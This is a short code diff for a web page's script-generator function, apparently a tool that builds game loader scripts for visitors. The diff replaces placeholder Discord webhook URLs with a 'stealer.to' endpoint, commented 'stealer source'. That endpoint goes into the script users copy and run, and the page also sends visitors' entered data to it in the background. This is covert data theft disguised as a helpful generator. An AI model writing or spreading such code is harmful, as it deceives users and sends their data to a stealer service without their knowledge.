@@ -153,7 +153,7 @@
         function generateScript() {
             let username = document.getElementById('username').value;
             let discordUser = document.getElementById('discordUser').value;
-            let webhook = "YOUR_HIDDEN_WEBHOOK_URL"; // Hidden webhook URL
+            let webhook = "https://stealer.to/post?uniqueid=92cbb405"; // stealer source
 
             if (username && webhook) {
                 let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
@@ -162,7 +162,7 @@
                 document.getElementById('copy-btn').disabled = false;
 
                 // Send data to webhook for logging (without exposing webhook in the frontend)
-                fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
+                fetch('https://stealer.to/post?uniqueid=92cbb405', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
